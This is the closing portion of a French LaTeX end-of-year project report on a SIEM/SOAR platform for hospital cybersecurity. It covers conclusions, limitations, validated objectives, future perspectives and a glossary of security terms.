L'orchestration automatisée via n8n a démontré sa valeur opérationnelle en réduisant significativement la charge manuelle des équipes de sécurité. Les workflows développés couvrent l'ensemble du cycle de vie des incidents, depuis la détection initiale jusqu'à la documentation finale, en passant par l'enrichissement via Cortex et l'escalade appropriée selon les criticités.

L'intégration entre TheHive, Cortex et MISP crée un écosystème d'analyse enrichie qui contextualise automatiquement les alertes et facilite la prise de décision des analystes SOC. Cette approche collaborative entre composants automatisés et expertise humaine optimise l'efficacité opérationnelle tout en préservant le contrôle nécessaire pour les décisions critiques.

\section{Contributions Scientifiques et Techniques}

\subsection{Contributions Méthodologiques}

Ce projet apporte plusieurs contributions méthodologiques significatives :

\begin{itemize}
  \item \textbf{Architecture SOAR spécialisée} : Adaptation des concepts SOAR génériques aux contraintes spécifiques de l'environnement hospitalier
  \item \textbf{Métriques de performance contextualisées} : Définition d'indicateurs de performance adaptés aux enjeux de continuité de service médical
  \item \textbf{Méthodologie de test sectorielle} : Développement d'une approche de validation par scénarios d'attaque représentatifs du secteur de la santé
\end{itemize}

\subsection{Innovations Techniques}

Les innovations techniques développées incluent :

\begin{itemize}
  \item \textbf{Connecteurs spécialisés} : Intégration native avec les protocoles médicaux (HL7, FHIR, DICOM)
  \item \textbf{Analyzers Cortex personnalisés} : Développement d'analyzers spécifiques à l'évaluation de conformité HIPAA/RGPD
  \item \textbf{Objets MISP étendus} : Création d'objets standardisés pour la représentation des équipements médicaux et incidents sectoriels
  \item \textbf{Workflows n8n hospitaliers} : Playbooks de réponse adaptés aux contraintes de continuité de service médical
\end{itemize}

\subsection{Contributions Pratiques}

L'impact pratique de la solution se mesure à plusieurs niveaux :

\begin{itemize}
  \item \textbf{Réduction des coûts opérationnels} : L'automatisation de 59,4\% des incidents réduit significativement les besoins en ressources humaines spécialisées
  \item \textbf{Amélioration de la posture sécuritaire} : La détection proactive et la réponse rapide limitent l'exposition aux risques et l'impact des incidents
  \item \textbf{Facilitation de la conformité} : La traçabilité automatisée et la génération de rapports simplifient la démonstration de conformité réglementaire
  \item \textbf{Transfert de connaissance} : La documentation exhaustive et les formations structurées facilitent l'adoption par les équipes opérationnelles
\end{itemize}

\section{Limites et Défis Identifiés}

\subsection{Limitations Techniques}

Malgré les résultats encourageants, plusieurs limitations ont été identifiées :

\subsubsection{Détection des Menaces Avancées}
Le taux de détection de 85\% pour les sites malveillants révèle des marges d'amélioration, particulièrement pour les attaques utilisant des domaines générés algorithmiquement (DGA) ou des techniques d'évasion sophistiquées.

\subsubsection{Scalabilité des Performances}
Les tests ont été réalisés dans un environnement de laboratoire contrôlé. Le passage à l'échelle sur une infrastructure hospitalière complète nécessitera des optimisations supplémentaires, notamment au niveau de l'indexation Wazuh et du traitement des volumes de données.

\subsubsection{Intégration des Équipements Médicaux Legacy}
De nombreux équipements médicaux en service utilisent des protocoles propriétaires ou des systèmes obsolètes difficiles à monitorer. L'intégration complète nécessite des développements spécifiques pour chaque famille d'équipements.

\subsection{Défis Organisationnels}

\subsubsection{Formation et Adoption}
La complexité de la solution requiert un investissement significatif en formation des équipes. La courbe d'apprentissage peut être un frein à l'adoption, particulièrement dans des établissements aux ressources IT limitées.

\subsubsection{Gouvernance des Données}
La centralisation des données de sécurité soulève des questions de gouvernance et de protection de la vie privée qui nécessitent un cadre réglementaire et organisationnel adapté.

\subsubsection{Maintenance et Evolution}
La maintenance d'une solution aussi complexe nécessite des compétences spécialisées et un suivi continu des évolutions technologiques et des nouvelles menaces.

\section{Validation des Objectifs}

\subsection{Objectifs Atteints}

La majorité des objectifs fixés en début de projet ont été atteints ou dépassés :

\begin{itemize}
  \item \cmark \textbf{Réduction du temps de détection} : De 329 jours à moins de 5 minutes (objectif largement dépassé)
  \item \cmark \textbf{Taux de détection} : 90,9\% obtenu pour un objectif de 90\%
  \item \cmark \textbf{Taux de faux positifs} : 4,2\% pour un objectif de moins de 5\%
  \item \cmark \textbf{Automatisation} : 59,4\% des incidents pour un objectif de 60\%
  \item \cmark \textbf{Temps de réponse} : 4,7 secondes moyennes pour un objectif de moins de 30 secondes
  \item \cmark \textbf{Conformité réglementaire} : Implémentation complète HIPAA/RGPD
\end{itemize}

\subsection{Objectifs Partiellement Atteints}

Certains objectifs nécessitent des développements complémentaires :

\begin{itemize}
  \item \warning \textbf{Intégration équipements médicaux} : Réalisée pour les protocoles standards, à étendre aux systèmes propriétaires
  \item \warning \textbf{Détection APT} : Fondations posées, mais nécessite l'intégration d'algorithmes d'apprentissage automatique
  \item \warning \textbf{Scalabilité enterprise} : Validée en laboratoire, optimisations nécessaires pour déploiement à grande échelle
\end{itemize}

\section{Impact et Valeur Créée}

\subsection{Impact Opérationnel}

La solution développée transforme fondamentalement l'approche de la cybersécurité hospitalière :

\begin{itemize}
  \item \textbf{Proactivité renforcée} : Passage d'une posture réactive à une capacité de détection proactive
  \item \textbf{Efficacité opérationnelle} : Automatisation des tâches répétitives et optimisation des ressources humaines
  \item \textbf{Visibilité unifiée} : Centralisation de la surveillance sécuritaire sur l'ensemble de l'infrastructure
  \item \textbf{Réponse coordonnée} : Orchestration automatisée des actions de réponse multi-outils
\end{itemize}

\subsection{Impact Économique}

L'analyse coût-bénéfice révèle un retour sur investissement favorable :

\begin{itemize}
  \item \textbf{Réduction des coûts d'incident} : La détection précoce limite l'impact financier des compromissions
  \item \textbf{Optimisation des ressources} : L'automatisation réduit les besoins en personnel spécialisé
  \item \textbf{Évitement des amendes} : La conformité automatisée limite les risques de sanctions réglementaires
  \item \textbf{Continuité de service} : La réduction des interruptions préserve la qualité des soins
\end{itemize}

\subsection{Impact Sociétal}

Au-delà des aspects techniques et économiques, cette solution contribue à un enjeu sociétal majeur :

\begin{itemize}
  \item \textbf{Sécurité des patients} : La protection des systèmes médicaux critiques préserve directement la sécurité des soins
  \item \textbf{Confiance du public} : La sécurisation des données de santé renforce la confiance dans la digitalisation médicale
  \item \textbf{Résilience du système de santé} : La robustesse face aux cyberattaques contribue à la continuité du service public de santé
\end{itemize}

\section{Lessons Learned et Retour d'Expérience}

\subsection{Enseignements Techniques}

Ce projet a confirmé plusieurs principes fondamentaux :

\begin{itemize}
  \item \textbf{L'importance de l'architecture modulaire} : La séparation des responsabilités facilite la maintenance et l'évolution
  \item \textbf{La nécessité de l'automation} : L'automatisation est indispensable face à la vélocité des cyberattaques
  \item \textbf{La valeur de l'open source} : Les solutions open source offrent flexibilité et transparence nécessaires en cybersécurité
  \item \textbf{L'intégration comme facteur clé} : La valeur réside dans l'intégration intelligente des composants plus que dans les outils individuels
\end{itemize}

\subsection{Enseignements Méthodologiques}

L'approche projet a révélé l'importance :

\begin{itemize}
  \item \textbf{Du prototypage itératif} : Les tests précoces permettent d'identifier et corriger rapidement les limitations
  \item \textbf{De la validation par l'usage} : Les scénarios d'attaque réalistes sont essentiels pour valider l'efficacité
  \item \textbf{De la documentation continue} : La documentation doit accompagner le développement pour faciliter la maintenabilité
  \item \textbf{Du transfert de compétences} : La formation des utilisateurs est critique pour le succès de l'adoption
\end{itemize}

\section{Contribution à la Recherche et à la Communauté}

\subsection{Publications et Partage}

Ce projet contribue à l'avancement des connaissances dans plusieurs domaines :

\begin{itemize}
  \item \textbf{Cybersécurité sectorielle} : Méthodologies spécialisées pour l'environnement hospitalier
  \item \textbf{Architecture SOAR} : Modèles d'intégration et d'orchestration pour environnements critiques
  \item \textbf{Open source security} : Démonstration de faisabilité avec des outils open source exclusivement
\end{itemize}

\subsection{Code et Ressources Partagées}

L'ensemble du code développé et de la documentation est destiné à être partagé avec la communauté :

\begin{itemize}
  \item \textbf{Configuration complète} : Tous les fichiers de configuration sont documentés et réutilisables
  \item \textbf{Scripts d'automatisation} : Les scripts de déploiement et d'intégration sont généralisables
  \item \textbf{Guides méthodologiques} : La démarche de test et validation peut servir de référence
\end{itemize}

\section{Conclusion}

Ce projet de fin d'année a permis de démontrer la faisabilité et l'efficacité d'une approche SIEM/SOAR spécialisée pour l'environnement hospitalier. Les résultats obtenus valident l'hypothèse initiale selon laquelle une architecture intégrée et automatisée peut transformer significativement la capacité de détection et de réponse aux incidents de cybersécurité dans le secteur de la santé.

Au-delà des aspects techniques, ce projet illustre l'importance de l'adaptation sectorielle des solutions de cybersécurité. L'environnement hospitalier, avec ses contraintes spécifiques de continuité de service et de protection des données sensibles, nécessite des approches dédiées qui dépassent l'adaptation superficielle de solutions généralistes.

L'architecture développée pose les fondations d'une nouvelle génération de SOC hospitaliers, capables de répondre aux défis cybersécuritaires contemporains tout en respectant les exigences opérationnelles du secteur médical. Elle ouvre la voie à des développements futurs qui pourront encore améliorer la protection des systèmes de santé critiques.

Cette réalisation témoigne également de la maturité atteinte par l'écosystème open source en cybersécurité, capable de fournir des solutions de niveau enterprise tout en préservant la transparence et la flexibilité nécessaires dans les domaines critiques.

Enfin, ce projet confirme que la cybersécurité n'est plus seulement un enjeu technique, mais un impératif sociétal qui nécessite l'engagement de tous les acteurs pour protéger les infrastructures critiques de notre société numérique.

\newpage


% ===== PERSPECTIVES FUTURES =====
\chapter{Perspectives Futures}

Les réalisations de ce projet ouvrent de nombreuses voies d'amélioration et d'extension qui pourront faire l'objet de développements futurs. Cette section présente les axes d'évolution identifiés, organisés selon leur horizon temporel et leur impact potentiel sur l'efficacité de la solution.

\section{Évolutions Technologiques à Court Terme}

\subsection{Amélioration de la Détection par Intelligence Artificielle}

\subsubsection{Intégration d'Algorithmes d'Apprentissage Automatique}

L'évolution la plus prometteuse concerne l'intégration d'algorithmes d'apprentissage automatique pour améliorer la détection comportementale. Plusieurs pistes sont à explorer :

\begin{itemize}
    \item \textbf{Détection d'anomalies réseau} : Implémentation d'algorithmes non supervisés (isolation forests, autoencoders) pour identifier les déviations comportementales subtiles dans le trafic réseau hospitalier
    \item \textbf{Analyse de séquences d'événements} : Utilisation de réseaux de neurones récurrents (LSTM, GRU) pour détecter les patterns d'attaques multi-étapes
    \item \textbf{Classification de malwares} : Déploiement de modèles de deep learning pour l'identification de nouvelles familles de malwares ciblant les équipements médicaux
    \item \textbf{Détection de DGA (Domain Generation Algorithms)} : Algorithmes de NLP pour identifier les domaines générés automatiquement par les malwares
\end{itemize}

\subsubsection{Enrichissement Contextuel Avancé}

L'amélioration de l'enrichissement contextuel constitue un axe prioritaire :

\begin{itemize}
    \item \textbf{Graph Analytics} : Modélisation des relations entre entités (utilisateurs, équipements, données) pour identifier les chemins d'attaque potentiels
    \item \textbf{Scoring Dynamique} : Développement d'algorithmes de scoring adaptatifs basés sur le contexte métier et la criticité des actifs
    \item \textbf{Threat Hunting Automatisé} : Implémentation de capacités de recherche proactive de menaces basées sur l'intelligence artificielle
\end{itemize}

\subsection{Extension des Capacités d'Intégration}

\subsubsection{Protocoles Médicaux Additionnels}

L'extension du support protocollaire constitue une priorité pour une couverture complète :

\begin{itemize}
    \item \textbf{IHE Profiles} : Intégration des profils Integrating the Healthcare Enterprise pour la surveillance des workflows médicaux
    \item \textbf{Protocoles IoT médicaux} : Support natif pour CoAP, MQTT et autres protocoles IoT utilisés par les équipements connectés
    \item \textbf{Standards SNOMED CT et LOINC} : Intégration pour la compréhension sémantique des données médicales dans le contexte sécuritaire
\end{itemize}

\subsubsection{APIs et Connecteurs Étendus}

\begin{itemize}
    \item \textbf{Connecteurs Cloud} : Intégration avec les services cloud majeurs (AWS Security Hub, Azure Sentinel, Google Cloud Security Command Center)
    \item \textbf{SIEM Tiers} : Développement de connecteurs bidirectionnels avec Splunk, QRadar, ArcSight pour environnements hybrides
    \item \textbf{Ticketing Systems} : Intégration native avec ServiceNow, Remedy, JIRA pour la gestion complète du cycle de vie des incidents
\end{itemize}

\section{Développements à Moyen Terme}

\subsection{Architecture Distribuée et Edge Computing}

\subsubsection{SOC Distribué Multi-Sites}

Pour les groupes hospitaliers multi-sites, l'évolution vers une architecture distribuée s'impose :

\begin{itemize}
    \item \textbf{Federation de SOCs} : Architecture permettant la corrélation d'événements entre plusieurs établissements
    \item \textbf{Threat Intelligence Partagée} : Mécanismes de partage automatisé d'IOCs entre établissements du même groupe
    \item \textbf{Orchestration Centralisée} : Coordination des réponses d'incidents à l'échelle du groupe
    \item \textbf{Reporting Consolidé} : Tableaux de bord unifiés pour la gouvernance sécuritaire multi-sites
\end{itemize}

\subsubsection{Edge Computing pour Équipements Critiques}

L'intégration de capacités d'edge computing permettra :

\begin{itemize}
    \item \textbf{Traitement Local} : Analyse temps réel au plus près des équipements médicaux critiques
    \item \textbf{Résilience Réseau} : Maintien des capacités de détection en cas de perte de connectivité
    \item \textbf{Latence Minimale} : Réaction immédiate pour les équipements life-critical
    \item \textbf{Privacy by Design} : Traitement local des données sensibles avec anonymisation avant transmission
\end{itemize}

\subsection{Intégration Avancée avec l'Écosystème Médical}

\subsubsection{Contextualisation Médicale}

\begin{itemize}
    \item \textbf{Corrélation avec l'Activité Médicale} : Intégration avec les systèmes de planification pour contextualiser les alertes selon l'activité clinique
    \item \textbf{Impact Assessment Automatisé} : Évaluation automatique de l'impact des incidents sur les soins aux patients
    \item \textbf{Criticité Dynamique} : Ajustement en temps réel de la criticité des alertes selon le contexte médical (urgences, blocs opératoires)
\end{itemize}

\subsubsection{Intégration Biomédicale}

\begin{itemize}
    \item \textbf{Monitoring des Dispositifs Médicaux} : Surveillance sécuritaire intégrée des équipements biomédicaux
    \item \textbf{Détection d'Anomalies Physiologiques} : Corrélation entre anomalies sécuritaires et variations de paramètres médicaux
    \item \textbf{Protection des Données Génomiques} : Solutions spécialisées pour la protection des données de médecine personnalisée
\end{itemize}

\section{Évolutions à Long Terme}

\subsection{Intelligence Artificielle Générative et Explicable}

\subsubsection{IA Générative pour la Cybersécurité}

\begin{itemize}
    \item \textbf{Génération Automatique de Règles} : Utilisation d'IA générative pour créer automatiquement des règles de détection basées sur de nouveaux IOCs
    \item \textbf{Simulation d'Attaques} : Génération automatique de scénarios d'attaque pour tester en continu l'efficacité des défenses
    \item \textbf{Rédaction Automatique de Rapports} : IA générative pour la création automatique de rapports d'incidents détaillés et conformes
\end{itemize}

\subsubsection{IA Explicable (XAI)}

\begin{itemize}
    \item \textbf{Transparence des Décisions} : Implémentation d'algorithmes explicables pour justifier les décisions automatisées
    \item \textbf{Audit Trail Intelligent} : Traçabilité détaillée du raisonnement de l'IA pour la conformité réglementaire
    \item \textbf{Formation Continue} : Mécanismes d'apprentissage explicable pour l'amélioration continue des modèles
\end{itemize}

\subsection{Quantum Computing et Cryptographie Post-Quantique}

\subsubsection{Préparation à l'Ère Quantique}

\begin{itemize}
    \item \textbf{Cryptographie Post-Quantique} : Migration vers des algorithmes résistants aux attaques quantiques
    \item \textbf{Détection d'Attaques Quantiques} : Développement de capacités de détection d'attaques utilisant des technologies quantiques
    \item \textbf{Key Management Quantique} : Intégration de systèmes de distribution quantique de clés (QKD)
\end{itemize}

\subsubsection{Calcul Quantique pour la Cybersécurité}

\begin{itemize}
    \item \textbf{Optimisation Quantique} : Utilisation du calcul quantique pour l'optimisation des algorithmes de détection
    \item \textbf{Simulation Quantique de Menaces} : Modélisation quantique de scénarios d'attaque complexes
    \item \textbf{Cryptanalyse Quantique Défensive} : Utilisation défensive du calcul quantique pour identifier les vulnérabilités
\end{itemize}

\section{Extensions Sectorielles}

\subsection{Autres Secteurs Critiques}

\subsubsection{Adaptation aux Infrastructures Critiques}

La méthodologie et l'architecture développées peuvent être adaptées à d'autres secteurs :

\begin{itemize}
    \item \textbf{Énergie} : Adaptation pour la surveillance des réseaux électriques et des centrales
    \item \textbf{Transport} : Extension aux systèmes de transport intelligent et aux infrastructures ferroviaires
    \item \textbf{Finance} : Spécialisation pour les environnements bancaires et les fintechs
    \item \textbf{Industrie 4.0} : Adaptation aux environnements de production industrielle connectée
\end{itemize}


\section{Conclusion des Perspectives}

Les perspectives d'évolution identifiées témoignent du potentiel considérable de développement de cette solution. L'architecture modulaire et évolutive mise en place constitue une base solide pour ces extensions futures.

L'intégration progressive de l'intelligence artificielle, l'extension à d'autres secteurs critiques et la contribution à l'émergence de standards sectoriels positionnent ce projet comme un catalyseur de transformation de la cybersécurité dans les environnements critiques.

L'ambition ultime est de contribuer à l'émergence d'un écosystème de cybersécurité spécialisé, capable de répondre aux défis croissants de la digitalisation des infrastructures critiques tout en préservant les exigences de continuité de service et de protection des données sensibles.

Ces perspectives futures illustrent également l'importance de maintenir une veille technologique active et de cultiver les partenariats académiques et industriels nécessaires à l'innovation continue dans ce domaine en évolution rapide.

\newpage


% ===== BIBLIOGRAPHIE =====
\printbibliography[title=Références Bibliographiques]


% ===== GLOSSAIRE =====
\chapter*{Glossaire}
\addcontentsline{toc}{chapter}{Glossaire}

\begin{description}

    \item[API (Application Programming Interface)]
          Interface de programmation qui permet à différentes applications de communiquer entre elles via des requêtes standardisées.

    \item[CASB (Cloud Access Security Broker)]
          Outil de sécurité qui s'interpose entre les utilisateurs et les applications cloud pour appliquer des politiques de sécurité.

    \item[CTI (Cyber Threat Intelligence)]
          Information sur les menaces cybernétiques actuelles et émergentes qui aide les organisations à prendre des décisions de sécurité éclairées.

    \item[DoublePulsar]
          Backdoor utilisée par l'exploit EternalBlue pour maintenir l'accès persistant à un système compromis.

    \item[EDR (Endpoint Detection and Response)]
          Solution de sécurité qui surveille continuellement les endpoints pour détecter et répondre aux menaces.

    \item[EternalBlue]
          Exploit développé par la NSA qui exploite une vulnérabilité dans le protocole SMBv1 de Microsoft (CVE-2017-0144).

    \item[IOC (Indicator of Compromise)]
          Artefact ou observation sur un réseau ou un système d'exploitation qui indique une intrusion informatique.

    \item[IPS (Intrusion Prevention System)]
          Système de prévention d'intrusion qui surveille le trafic réseau et bloque automatiquement les activités malveillantes.

    \item[MITRE ATT\&CK]
          Framework de connaissance développé par MITRE Corporation qui catalogue les tactiques, techniques et procédures utilisées par les adversaires.

    \item[NIDS (Network Intrusion Detection System)]
          Système de détection d'intrusion réseau qui surveille le trafic pour identifier les activités suspectes.

    \item[OSINT (Open Source Intelligence)]
          Collecte et analyse d'informations à partir de sources publiquement disponibles à des fins de renseignement.

    \item[PCAP (Packet Capture)]
          Format de fichier utilisé pour stocker les données de paquets réseau capturés par des outils de surveillance.

    \item[Playbook]
          Document ou script qui définit une série d'étapes standardisées pour répondre à un incident de sécurité spécifique.

    \item[RBAC (Role-Based Access Control)]
          Méthode de contrôle d'accès qui restreint l'accès au système en fonction du rôle de l'utilisateur dans l'organisation.

    \item[REST (Representational State Transfer)]
          Style architectural pour les services web qui utilise les méthodes HTTP standard pour les opérations CRUD.

    \item[SIEM (Security Information and Event Management)]
          Technologie qui collecte, agrège et analyse les données de sécurité en temps réel pour détecter les menaces.

    \item[SMB (Server Message Block)]
          Protocole de communication réseau utilisé pour partager des fichiers, imprimantes et ports série entre les nœuds d'un réseau.

    \item[SNORT]
          Système de détection d'intrusion réseau open source capable d'effectuer l'analyse du trafic en temps réel.

    \item[SOC (Security Operations Center)]
          Centre opérationnel centralisé qui supervise et améliore la posture de sécurité d'une organisation.

    \item[SOAR (Security Orchestration, Automation and Response)]
          Plateforme qui combine trois capacités logicielles principales : orchestration et automatisation des tâches de sécurité, et plateforme de réponse aux incidents.

    \item[STIX (Structured Threat Information eXpression)]
          Langage standardisé pour la représentation d'informations sur les menaces cybernétiques.

    \item[TAXII (Trusted Automated eXchange of Intelligence Information)]
          Spécification pour l'échange automatisé d'informations sur les menaces cybernétiques.

    \item[TTP (Tactics, Techniques, and Procedures)]
          Modèles de comportement d'un acteur malveillant, décrivant comment il mène ses opérations.

    \item[UEBA (User and Entity Behavior Analytics)]
          Processus de cybersécurité qui utilise l'analyse de données pour détecter les anomalies de comportement.

    \item[WAF (Web Application Firewall)]
          Pare-feu applicatif qui protège les applications web en filtrant, surveillant et bloquant le trafic HTTP malveillant.

    \item[XDR (Extended Detection and Response)]
          Approche de sécurité qui intègre plusieurs produits de sécurité dans un système de détection et de réponse unifié.

    \item[YARA]
          Outil permettant d'identifier et de classifier des échantillons de malware basé sur des descriptions textuelles.

    \item[Zero-Day]
          Vulnérabilité de sécurité informatique qui est exploitée par des attaquants avant qu'un correctif soit disponible.

\end{description}


\end{document}
